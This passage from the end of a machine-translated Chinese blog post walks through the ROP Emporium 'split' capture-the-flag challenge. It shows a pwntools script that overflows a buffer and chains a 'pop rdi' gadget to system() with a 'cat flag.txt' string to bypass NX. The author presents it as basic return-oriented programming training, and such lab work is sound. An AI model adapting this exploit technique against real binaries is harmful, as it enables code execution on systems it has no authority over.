kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">3.将单个参数(" cat /bin/flag.txt ")传递给system()</p><p id="b942" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated">4.完成的</p></blockquote><pre class="mf mg mh mi gt mr ms mt mu aw mv bi"><span id="d17a" class="mw lc iq ms b gy mx my l mz na">from pwn import *<br/><br/>print("**************** Check-sec ***************")                       xrx = ELF('./split')                       print("******************************************")</span><span id="6264" class="mw lc iq ms b gy nb my l mz na">payload   = "A" * 40</span><span id="9a1a" class="mw lc iq ms b gy nb my l mz na">payload  += p64(0x004007c3) # pop rdi</span><span id="1d73" class="mw lc iq ms b gy nb my l mz na">payload  += p64(0x00601060) # /bin/cat flag.txt</span><span id="16da" class="mw lc iq ms b gy nb my l mz na">payload  += p64(0x00400560) # sytem()</span><span id="1f86" class="mw lc iq ms b gy nb my l mz na">p = xrx.process()<br/>print p.recvuntil("&gt;")<br/>p.clean()</span><span id="cc74" class="mw lc iq ms b gy nb my l mz na">p.sendline(payload)<br/>p.recv()<br/>p.interactive()<br/>print p.clean()</span></pre><p id="6162" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">剥削的艺术更上一层楼。运行漏洞检查看看会发生什么…</p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mq"><img src="../Images/315b6ec412af6ebf77ca49bd55807af1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*luJLixqVhhz3hEwXTCPBYA.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">ROPE{a_placeholder_32byte_flag！}</figcaption></figure><p id="b106" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">就这样…我们已经有效地改变了预期的执行流并找到了标志。</p><blockquote class="mj mk ml"><p id="266f" class="kc kd mm ke b kf kg kh ki kj kk kl km mn ko kp kq mo ks kt ku mp kw kx ky kz ij bi translated"><strong class="ke ir">提醒</strong> <br/>这些只是展示我们如何绕过支持NX的二进制安全性的基础知识。根据你的冥想，你可以出乎意料地利用它。<strong class="ke ir">这篇文章旨在用一个简单的例子来适应ROP。</strong></p></blockquote></div><div class="ab cl ob oc hu od" role="separator"><span class="oe bw bk of og oh"/><span class="oe bw bk of og oh"/><span class="oe bw bk of og"/></div><div class="ij ik il im in"><blockquote class="nj"><p id="6c21" class="nk nl iq bd nm nn no np nq nr ns kz dk translated">如果你高兴的话，最好和我联系。在接下来的文章中，我们将谈论一些更伟大的事情…！！</p></blockquote><p id="bc11" class="pw-post-body-paragraph kc kd iq ke b kf oi kh ki kj oj kl km kn ok kp kq kr ol kt ku kv om kx ky kz ij bi translated"><strong class="ke ir"> <em class="mm">随时在Twitter上连接</em> </strong> <a class="ae la" href="https://twitter.com/7h3h4ckv157" rel="noopener ugc nofollow" target="_blank"> @7h3h4ckv157 </a></p><figure class="mf mg mh mi gt jr gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/23bfd757579fe7074072d7b83d548fa7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-nd8IYTEhIlHK4ljYd7wKg.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated"><strong class="bd ld">感谢阅读..！！</strong>😉</figcaption></figure></div></div>    
</body>
</html>